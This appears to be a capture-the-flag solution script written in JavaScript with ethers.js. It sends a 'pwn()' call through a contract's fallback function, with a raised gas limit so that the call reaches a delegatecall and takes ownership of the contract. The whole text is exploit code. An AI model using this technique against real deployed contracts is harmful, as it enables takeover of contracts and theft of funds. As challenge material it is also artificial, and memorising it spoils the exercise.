const main = async () => {
  const [signer] = await ethers.getSigners();
  let txn = await signer.sendTransaction({
    to: '0xfa10BcC2Eed1169E6eFf0EaA910E2335E0fA6C78',
    data: ethers.utils.keccak256(ethers.utils.toUtf8Bytes('pwn()')),
    //Gas limit is important for this one, because hardhat automatically
    //sends only enough gas for fallback function and not enough for the
    //delegateCall function.
    gasLimit: 6000000,
  });
  txn.wait();
  console.log(txn);
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
